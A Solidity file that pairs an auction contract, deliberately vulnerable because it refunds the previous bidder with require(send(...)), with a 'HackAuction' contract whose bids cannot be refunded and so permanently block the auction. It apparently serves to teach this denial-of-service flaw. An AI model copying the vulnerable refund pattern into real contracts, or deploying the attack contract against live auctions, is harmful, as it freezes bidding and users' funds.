// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract Auction {
    address currentLeader;
    uint highestBid;

    function bid() external payable {
        require(msg.value > highestBid);
        // Send the money back to the current leader
        require(payable(currentLeader).send(highestBid));

        // Update leader and highest bid
        currentLeader = msg.sender;
        highestBid = msg.value;
    }
}

contract HackAuction {
    event Response(bool success, bytes data);

    function hackBid(address payable auctionContract) public payable {
        (bool success, bytes memory data) = auctionContract.call{value: msg.value}(
            abi.encodeWithSignature("bid()")
        );
        emit Response(success, data);
    }
}
